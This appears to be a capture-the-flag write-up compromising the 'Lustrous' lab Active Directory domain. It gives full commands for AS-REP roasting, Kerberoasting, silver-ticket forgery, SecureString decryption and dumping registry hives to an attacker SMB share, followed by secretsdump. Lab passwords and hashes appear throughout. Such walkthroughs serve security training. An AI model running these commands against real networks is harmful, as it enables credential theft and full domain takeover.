
			![[CHAINS___/LUSTROUS/Cover_.png]]


### RECON

```
Nmap scan report for 10.10.174.149
Host is up (0.19s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_12-26-21  11:50AM       <DIR>          transfer
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-10 18:30:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Subject Alternative Name: DNS:LusDC.lustrous.vl
| Not valid before: 2021-12-26T09:46:02
|_Not valid after:  2022-12-26T00:00:00
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Not valid before: 2024-07-09T18:26:34
|_Not valid after:  2025-01-08T18:26:34
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSDC
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusDC.lustrous.vl
|   DNS_Tree_Name: lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-10T18:30:27+00:00

```


```
Nmap scan report for 10.10.174.150
Host is up (0.19s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LusMS.lustrous.vl
| Not valid before: 2024-07-09T18:26:31
|_Not valid after:  2025-01-08T18:26:31
|_ssl-date: 2024-07-10T18:31:10+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSMS
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusMS.lustrous.vl
|   DNS_Tree_Name: lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-10T18:30:31+00:00

```




### INITIAL_ACCESS


![[ftp_anonymous.png]]

That file wasn't helpful , but we got bunch of usernames !


```zsh
impacket-GetNPUsers -no-pass -usersfile users_ lustrous.vl/ -dc-ip 10.10.174.149
```


![[ben_cox_hash.png]]


Cool ! We got credential of domain user , Now there opened alot of possibilities for enumerations !


Lets Run Bloodhound !

```zsh
bloodhound-python --domain lustrous.vl --username ben.cox --password 'Trinity1' -ns 10.10.174.149 --collectionmethod all --zip --dns-tcp
```



![[LUSMS_WINRM.png]]


But We gotta decrypt the password file , that has been encrypted !

![[Encrypted_.png]]


FOLLOW THE STEP : [Blog](https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8)

```powershell
$user = "LUSMS\Administrator"

$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367" | ConvertTo-SecureString

$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

$cred.GetNetworkCredential() | fl
```

We get the credentials of Administrator !

![[Admin_Creds.png]]


![[Pwned_LuSMS.png]]



```zsh
impacket-GetUserSPNs lustrous.vl/ben.cox:Trinity1 -dc-ip 10.10.174.149 -request
```
 

![[TGS.png]]


![[Cracking_Creds.png]]

Only svc_web hash was cracked ! Progress , Lets see the privilege of this account ! 



Services in domains are often run by service accounts instead of using local accounts like SYSTEM. Since the account is called svc_web we assume the application pool on the webserver is run by this user. This gives us an interesting attack vector. We can generate a silver ticket using the ntlm hash of svc_web & impersonate any user against the web application.


As Tony.Ward is Backup Operator , high privilege user , we need to create silver ticket and see whats on the page.


![[Tony_Property.png]]

[ We can get domain-sid , user-id from blood-hound  and nthash is just ntlm hash of svc_web credentials we got !]


```zsh
impacket-ticketer -nthash E67AF8B3D78DF5A02EB0D57B6CB60717 -domain-sid S-1-5-21-2355092754-1584501958-1513963426 -domain lustrous.vl -spn HTTP/lusdc.lustrous.vl -user-id 1114 tony.ward


export KRB5CCNAME=tony.ward.ccache 

firefox

START FIREFOX from that session , and add http://lusdc.lustrous.vl in network.negotiate-auth.trusted-uris

```



![[config_firefox.png]]

Now we can see the contents of that note !


![[Note_Tony.png]]



In Simple Terms , We impersonated tony.ward with the hash of svc_web which is the service account for web services , which only used kerberos as authentication !




### PRIVILEGE_


Now as we got credentials of tony , We can extract SAM , SYSTEM and SECURITY file from the domain controller !


![[Tony_Backup.png]]



Can Use ,  [ impacket-reg from linux easy peasy ! ]

https://github.com/mpgn/BackupOperatorToDA




```powershell
.\BackupOperatorToDA.exe -u tony.ward -p U_cPVQqEI50i1X -d lustrous.vl -t \\LUSDC.lustrous.vl -o \\10.8.0.148\share\
```


```zsh
impacket-smbserver -smb2support share .
```


![[Backup_Operator.png]]

```zsh
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

![[LOCAL_SecretsDump.png]]


We dumped the local administrator hash, if the domain administrator password would be the same we would be done here. If not, we can use the machine account hash to do a proper secretsdump now and use any domain admin to log in:


```zsh
impacket-secretsdump lustrous.vl/'LUSDC$'@10.10.174.149 -hashes :eb2637e0b69eb988e8cd9172ea802388
```


![[That's IT.png]]



![[PWNED__.png]]



